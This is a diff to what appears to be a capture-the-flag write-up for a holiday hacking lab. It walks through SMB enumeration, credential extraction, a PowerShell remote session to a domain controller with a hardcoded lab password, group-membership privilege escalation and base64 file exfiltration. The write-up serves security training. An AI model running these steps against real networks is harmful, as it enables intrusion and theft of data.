@@ -97,19 +97,19 @@ smbclient -U elfu_svc -L \\SHARE30 -I 10.128.3.30
 </details>
 
 <details>
-  <summary>RCE Hint 1</summary>
+  <summary>RCE - Hint 1</summary>
   What are the different ways I can get a shell or session on the remote host? We know it's the Domain Controller based on nmap scans.
 </details>
 <details>
-  <summary>RCE Answer 1</summary>
+  <summary>RCE - Answer 1</summary>
   Modify the RCE command for a session instead. Powershell has a built-in session setup command - https://github.com/chrisjd20/hhc21_powershell_snippets
 </details>
 <details>
-  <summary>RCE Hint 2</summary>
+  <summary>RCE - Hint 2</summary>
   It may work better if you can extract the cleartext password and pass that into the Enter-PSSession call.
 </details>
 <details>
-  <summary>RCE Answer 2</summary>
+  <summary>RCE - Answer 2</summary>
   $creds = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", "A1d655f7f5d98b10!")
   
   Enter-PSSession -ComputerName 10.128.1.53 -Credential $creds -Authentication Negotiate
@@ -152,11 +152,19 @@ pwsh
 </details>
 <details>
   <summary>Loot - Hint 2</summary>
-  
+  How can we get this file from the SSH server to view it or read its data?
 </details>
 <details>
   <summary>Loot - Answer 2</summary>
+  SCP doesn't work. Just copy paste it out. Or the linux binary "strings" may work.
   
+```
+openssl base64 -in SantaSecretToAWonderfulHolidaySeason.pdf -out LOOT.pdf
+cat LOOT.pdf | tr -d '\n'
+copy paste to host machine to view the PDF (save to loot.pdf)
+cat loot.pdf | base64 -d > final.pdf
+```
+
 </details>
 
 
@@ -227,17 +235,19 @@ echo "Snow2021!"
 ```
 
 ### Data Exfil for Secrets
-`nmblookup -A 10.128.3.30`
-`smbclient -L \\SHARE30 -I 10.128.3.30 -N`
-`smbclient -U elfu_svc -L \\SHARE30 -I 10.128.3.30`
-get GetProcessInfo.ps1
-Find creds for RCE method inside GetProcessInfo.ps1
+```
+nmblookup -A 10.128.3.30
+smbclient -L \\SHARE30 -I 10.128.3.30 -N
+smbclient -U elfu_svc -L \\SHARE30 -I 10.128.3.30
+```
+get GetProcessInfo.ps1\
+Find creds for RCE method inside GetProcessInfo.ps1\
 `pwsh -File GetProcessInfo.ps1` or `pwsh -Command ./GetProcessInfo.ps1`
 
 
-### RCE on the DC
-Modify the RCE command for a session instead
-info: https://github.com/chrisjd20/hhc21_powershell_snippets
+### RCE
+Modify the RCE command for a session instead\
+info: https://github.com/chrisjd20/hhc21_powershell_snippets\
 Extract the clear-text password.
 ```
 $creds = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", "A1d655f7f5d98b10!")
@@ -245,11 +255,10 @@ Enter-PSSession -ComputerName 10.128.1.53 -Credential $creds -Authentication Neg
 ```
 
 ### Privilege Escalation
-Info: https://github.com/chrisjd20/hhc21_powershell_snippets
-Tip: $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
-The first large chunk script uses the remote_elf permissions
-The second large chunk script uses the SSH user permissions
-
+Info: https://github.com/chrisjd20/hhc21_powershell_snippets\
+Tip: $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"\
+The first large chunk script uses the remote_elf permissions\
+The second large chunk script uses the SSH user permissions\
 Verify SSH username membership in the group:
 ```
 pwsh
@@ -257,18 +266,12 @@ pwsh
 ```
 
 ### THE LOOT!
-After you've added the ResearchDepartment group to your SSH user, connect to their share and retreive the loot!
-smbclient -U knuefahyyw \\\\SHARE30\\research_dep -I 10.128.3.30
+After you've added the ResearchDepartment group to your SSH user, connect to their share and retreive the loot!\
+`smbclient -U knuefahyyw \\\\SHARE30\\research_dep -I 10.128.3.30`\
 get SantaSecretToAWonderfulHolidaySeason.pdf
+```
 openssl base64 -in SantaSecretToAWonderfulHolidaySeason.pdf -out LOOT.pdf
 cat LOOT.pdf | tr -d '\n'
 copy paste to host machine to view the PDF (save to loot.pdf)
 cat loot.pdf | base64 -d > final.pdf
-
-
-
-
-<details>
-  <summary>REPLACE</summary>
-  
-</details>
+```
